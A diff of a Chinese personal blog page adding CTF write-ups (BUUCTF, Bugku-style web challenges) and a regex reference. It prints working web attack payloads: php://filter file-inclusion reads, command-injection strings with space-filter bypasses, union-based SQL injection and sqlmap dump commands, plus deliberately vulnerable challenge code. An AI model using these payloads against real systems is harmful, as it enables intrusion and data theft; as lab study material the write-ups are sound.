@@ -64,6 +64,323 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-buuctf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/05/buuctf/" class="article-date">
+  <time datetime="2021-04-05T12:29:14.000Z" itemprop="datePublished">2021-04-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/05/buuctf/">buuctf</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>点开容器，发现<img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\1.png" alt="1"></p>
+<p>点击<code>tips</code><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\2.png" alt="2"></p>
+<p>发现是用文件包含的方式打开flag.php文件</p>
+<p>之前刷题有做过用php://filter读取文件源码，这题试一下</p>
+<p><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\3.png" alt="3"></p>
+<p>用base64-decode</p>
+<meta charset="utf8">
+<?php
+error_reporting(0);
+$file = $_GET["file"];
+if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
+    exit('hacker!');
+}
+if($file){
+    include($file);
+}else{
+    echo '<a href="?file=flag.php">tips';
+}
+?>
+
+<p>index.php里没内容，看一下flag.php里的</p>
+<p><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\4.png" alt="4"></p>
+<p>用base64-decode</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>点开容器，发现什么也没有，用御剑跑了一下，发现容易服务器崩，线程少又跑的慢，点击查看源码<img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\5.png" alt="5"></p>
+<p>点开箭头所指链接<img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\6.png" alt="6"></p>
+<p>点开箭头所指链接，发现会302跳转到end.php说明这里面有猫腻</p>
+<p>burp抓包，发送到Repeater<img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\7.png" alt="7"></p>
+<p>访问secr3t.php，得一段代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">    <span class="attr">highlight_file</span>(<span class="attr">__FILE__</span>);</span></span><br><span class="line"><span class="tag">    <span class="attr">error_reporting</span>(<span class="attr">0</span>);</span></span><br><span class="line"><span class="tag">    $<span class="attr">file</span>=<span class="string">$_GET[</span>&#x27;<span class="attr">file</span>&#x27;];</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span>(<span class="attr">strstr</span>($<span class="attr">file</span>,&quot;<span class="attr">..</span>/&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>, &quot;<span class="attr">tp</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">input</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">data</span>&quot;))&#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">echo</span> &quot;<span class="attr">Oh</span> <span class="attr">no</span>!&quot;;</span></span><br><span class="line"><span class="tag">        <span class="attr">exit</span>();</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">include</span>($<span class="attr">file</span>); </span></span><br><span class="line"><span class="tag">//<span class="attr">flag</span>放在了<span class="attr">flag.php</span>里</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里进行下一步的时候我放了一个错误，我知道要用php://filter读取flag文件，但是错误的在index.php后传参的，</p>
+<p>也就是：<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php </code>这样是错误的，因为index.php没有文件包含，</p>
+<p>因此我们要改成：<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php </code></p>
+<p><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\8.png" alt="8"></p>
+<p>对箭号所指的字符串base64解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            echo &quot;æå°±å¨è¿é&quot;;</span><br><span class="line">            $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;;</span><br><span class="line">            $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得flag</p>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>点开容器，发现一个ping窗口</p>
+<p>ping一下容器地址<img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p>
+<p>回顾一下系统命令的<code>管道符</code></p>
+<p>1、<code>|</code>（就是按位或），直接执行|后面的语句 </p>
+<p>2、<code>||</code>（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 </p>
+<p>3、<code>&amp;</code>（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、<code>&amp;&amp;</code>（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 </p>
+<p>5、<code>; </code>前后都执行，无论前面真假，同&amp;，（linux也有）</p>
+<p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls</code>——查看当前目录下的文件</p>
+<p><img src="file:///C:\Users\Lenovo\AppData\Roaming\Tencent\Users\1229868178\QQ\WinTemp\RichOle\5EUK[SRA(WKLCM)4}{PF[UE.png" alt="img"></p>
+<p>看来flag不在当前目录下</p>
+<p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /</code>——查看根目录下的文件</p>
+<p><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\10.png" alt="10"></p>
+<p>我们看到在根目录下存在一个名为flag的文件</p>
+<p>ping：<code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag</code></p>
+<p>得flag</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>点开容器</p>
+<p><strong>直接开始ping</strong></p>
+<p><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\11.png" alt="11"></p>
+<p><strong>发现不能payload里面不能有空格</strong><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\12.png" alt="12"></p>
+<p><strong>补充一个知识点（命令执行空格绕过）</strong>：</p>
+<p><code> &lt;</code> <code>&lt;&gt;</code> <code>&gt;</code> 重定向符<br> <code>%09</code>(需要php环境)<br> <code>$&#123;IFS&#125; </code><br> <code>$IFS$9</code><br> <code>&#123;cat,flag.php&#125;</code>  //用逗号实现了空格功能<br> <code>%20 </code></p>
+<p><strong>那么我们尝试用重定向符绕过</strong><img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\13.png" alt="13"></p>
+<p>发现部分符号也被禁用了，</p>
+<p>那么我们尝试用<code>$IFS$9</code>绕过，绕过成功，尝试cat flag<img src="/.com//Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf\14.png" alt="14"></p>
+<p>发现flag都被禁了，那我们cat index.php，得一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到它禁用了很多的符号，这边要注意它严格过滤了flag——只要字符串中有按顺序存在<code>f</code> <code>l</code> <code>a</code> <code>g</code>就会被警告</p>
+<p><strong>法1</strong>：由于存在shell_exec，我们可以尝试设参，如构造payload：<code>?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php</code></p>
+<p>这句话其实在终端就执行了两句话，一个是ping端口127.0.0.1，另一个是执行cat flag.php文件。中间两句是设置变量赋值。</p>
+<p><strong>法2：</strong></p>
+<p>参考：</p>
+<p>命令执行绕过：<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/">https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
+<p>wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control">https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/05/buuctf/" data-id="ckn63kztm0001jkvu95pm7f8v" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-正则表达式" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="article-date">
+  <time datetime="2021-04-04T08:04:04.000Z" itemprop="datePublished">2021-04-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则匹配</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h4><p>描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
+<ul>
+<li><strong>正则表达式常用修饰符：</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">修饰符</th>
+<th align="left">含义</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>i</strong></td>
+<td align="left">ignore - 不区分大小写</td>
+<td align="left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td>
+</tr>
+<tr>
+<td align="left">g</td>
+<td align="left">global - 全局匹配</td>
+<td align="left">查找所有的匹配项。</td>
+</tr>
+<tr>
+<td align="left">m</td>
+<td align="left">multi line - 多行匹配</td>
+<td align="left">使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td>
+</tr>
+<tr>
+<td align="left">s</td>
+<td align="left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td>
+<td align="left">默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><strong>常见的正则匹配字符:</strong></p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\</td>
+<td><strong>将下一个字符标记为一个特殊字符</strong>、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\‘ 匹配 “\“ 而 “\(“ 则匹配 “(“。</td>
+</tr>
+<tr>
+<td>^</td>
+<td><strong>匹配输入字符串的开始位置。</strong>如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td>
+</tr>
+<tr>
+<td>$</td>
+<td><strong>匹配输入字符串的结束位置。</strong>如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td>
+</tr>
+<tr>
+<td>\d</td>
+<td>匹配一个数字字符。等价于 [0-9]。</td>
+</tr>
+<tr>
+<td>\d+</td>
+<td>匹配多个数字。</td>
+</tr>
+<tr>
+<td>\D</td>
+<td>匹配一个非数字字符。等价于 [ ^0-9]。</td>
+</tr>
+<tr>
+<td>x|y</td>
+<td>匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td>
+</tr>
+<tr>
+<td>[xyz]</td>
+<td>字符集合。<strong>匹配所包含的任意一个字符</strong>。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td>
+</tr>
+<tr>
+<td>[^xyz]</td>
+<td>负值字符集合。<strong>匹配未包含的任意字符</strong>。例如， ‘[ ^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。</td>
+</tr>
+<tr>
+<td>[a-z]</td>
+<td>字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td>
+</tr>
+<tr>
+<td>[^a-z]</td>
+<td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[ ^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td>
+</tr>
+<tr>
+<td>*</td>
+<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
+</tr>
+<tr>
+<td>+</td>
+<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
+</tr>
+<tr>
+<td>{n}</td>
+<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
+</tr>
+<tr>
+<td>{n,}</td>
+<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
+</tr>
+<tr>
+<td>{n,m}</td>
+<td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
+</tr>
+<tr>
+<td><strong>.</strong></td>
+<td><strong>匹配任何字符</strong>，换行符（\n、\r）除外。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>PHP的正则表达式有一些内置的通用字符簇，列表如下：</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>字符簇</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[[:alpha:]]</td>
+<td>任何字母</td>
+</tr>
+<tr>
+<td>[[:digit:]]</td>
+<td>任何数字</td>
+</tr>
+<tr>
+<td>[[:alnum:]]</td>
+<td>任何字母和数字</td>
+</tr>
+<tr>
+<td>[[:space:]]</td>
+<td>任何空白字符</td>
+</tr>
+<tr>
+<td>[[:upper:]]</td>
+<td>任何大写字母</td>
+</tr>
+<tr>
+<td>[[:lower:]]</td>
+<td>任何小写字母</td>
+</tr>
+<tr>
+<td>[[:punct:]]</td>
+<td>任何标点符号</td>
+</tr>
+<tr>
+<td>[[:xdigit:]]</td>
+<td>任何16进制的数字，相当于[0-9a-fA-F]</td>
+</tr>
+</tbody></table>
+<p>sp： php的正则表达式需要放在<code>//</code> 之间</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckn63kztl0000jkvu5guch2lh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-DVWA—JS" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/03/18/DVWA%E2%80%94JS/" class="article-date">
@@ -176,20 +493,36 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="web11："><a href="#web11：" class="headerlink" title="web11："></a>web11：</h1><p> 这题的题目是：网站被黑了 黑客会不会留下后门</p>
+        <h1 id="web11：（御剑扫描后端）"><a href="#web11：（御剑扫描后端）" class="headerlink" title="web11：（御剑扫描后端）"></a>web11：（御剑扫描后端）</h1><p> 这题的题目是：网站被黑了 黑客会不会留下后门</p>
 <p>那么我们要借助御剑这个后门扫描工具，扫描目标网站，发现有个shell.php文件<img src="/.com//1.png" alt="1"></p>
 <p>访问shell.php<img src="/.com//2.png" alt="2"></p>
 <p>用bp抓包爆破可知密码为<code>hack</code></p>
 <p><img src="/.com//3.png" alt="3"></p>
 <p>pass为hack，登入<img src="/.com//4.png" alt="4"></p>
-<h1 id="web13："><a href="#web13：" class="headerlink" title="web13："></a>web13：</h1><p>题目叫我们看看源码，我们看看源码：</p>
+<h1 id="web13：（url解码）"><a href="#web13：（url解码）" class="headerlink" title="web13：（url解码）"></a>web13：（url解码）</h1><p>题目叫我们看看源码，我们看看源码：</p>
 <p><img src="/.com//5.png" alt="5"></p>
 <p>我们对其url解码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=document.getElementById(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">       alert(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">       a.focus();</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>
 
 <p>提交字符串<code>67d709b2b54aa2aa648cf6e87a7114f1</code></p>
 <p><img src="/.com//6.png" alt="6"></p>
-<h1 id="web16："><a href="#web16：" class="headerlink" title="web16："></a>web16：</h1><p>进入环境后发现就一串数字，其他什么也没有，检查网页源码，抓包看回显都没有什么线索，又用御剑扫描网页后台</p>
+<h1 id="web14：（文件包含加php-filter）"><a href="#web14：（文件包含加php-filter）" class="headerlink" title="web14：（文件包含加php://filter）"></a>web14：（文件包含加php://filter）</h1><p>进入题目，看到<img src="/.com//15.png" alt="15"></p>
+<p>点击<code>click me？ no</code>跳转<img src="/.com//16.png" alt="16"></p>
+<p>发现是文件包含题。</p>
+<ul>
+<li><strong>补充</strong></li>
+</ul>
+<ol>
+<li>include()函数对文件后缀名无要求，而对其中的语法有要求，即使后缀名为txt，jpg也会被当做php文件解析，只要文件内是<?php ?>形式就可以执行，但是如果不是php语法的形式，即使后缀为php，也无法执行。</li>
+<li><strong>php://filter</strong> 设计用来过滤筛选文件。如果想要读取运行php文件的源码，需要先对该php文件内容base64编码，再传入include函数，这样就不会被认为是php代码，不会执行，会输出文件的base64编码，后续再解码即可获得源码。</li>
+</ol>
+<p>故本题payload为：<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><img src="/.com//17.png" alt="17"></p>
+<p>base64解码：<img src="/.com//18.png" alt="18"></p>
+<p>参考博客:</p>
+<p><code>https://blog.csdn.net/zpy1998zpy/article/details/80598768</code></p>
+<p><code>https://www.freebuf.com/column/148886.html</code></p>
+<h1 id="web16：（MD5-函数绕过）"><a href="#web16：（MD5-函数绕过）" class="headerlink" title="web16：（MD5()函数绕过）"></a>web16：（MD5()函数绕过）</h1><p>进入环境后发现就一串数字，其他什么也没有，检查网页源码，抓包看回显都没有什么线索，又用御剑扫描网页后台</p>
 <p><img src="/.com//7.png" alt="7"></p>
 <p>发现一个.bak拓展名（bak这种备份文件在我们平常使用绘图、编程软件时都会默认创建备份文件，如cad文件修改后会产生bak文件，wps、word等文件修改后也都会产生bak备份文件，这样可以保证当源文件不小心被删掉或者出现故障导致无故自动退出时，还可以从bak备份文件继续编辑，减少了不少误操作带来的损失。）的文件，结合描述的信息：备份是个好习惯，我们可以猜测这个.bak拓展名文件应该有东西</p>
 <p>下载文件并打开<img src="/.com//35@%25PWPHHUMJX79WMRZM%5B_5.png" alt="img"></p>
@@ -198,7 +531,16 @@
 <p>我们用双写绕过字符串过滤，利用md5()函数无法处理数组（如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。）达成if条件。</p>
 <p>因此我们的payload是<code>?kekeyy1[]=1&amp;kekeyy2[]=2</code></p>
 <p><img src="/.com//8.png" alt="8"></p>
-<h1 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h1><p>打开题目地址发现是一堆乱码，我还以为乱码里面有内容，分析了一通，结果什么也没有。</p>
+<h1 id="web17-sql注入——post型"><a href="#web17-sql注入——post型" class="headerlink" title="web17:(sql注入——post型)"></a>web17:(sql注入——post型)</h1><h3 id="1-手工注入："><a href="#1-手工注入：" class="headerlink" title="1.手工注入："></a>1.手工注入：</h3><p>查数字段值：0’ union select 1,2,3,4#</p>
+<p>爆库：0’ union select 1,2,3,database()#</p>
+<p>爆表：0’ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=’skctf’#</p>
+<p>爆列：0’ union select 1,2,3,group_concat(column_name) from information_schema.tables where table_name=fl4g#</p>
+<p>爆值：0’ union select 1,2,3,skctf_flag form fl4g#</p>
+<h3 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h3><p>爆库：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; --current-db</code></p>
+<p>爆表：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf --tables</code></p>
+<p>爆列：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns</code></p>
+<p>爆值：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump </code></p>
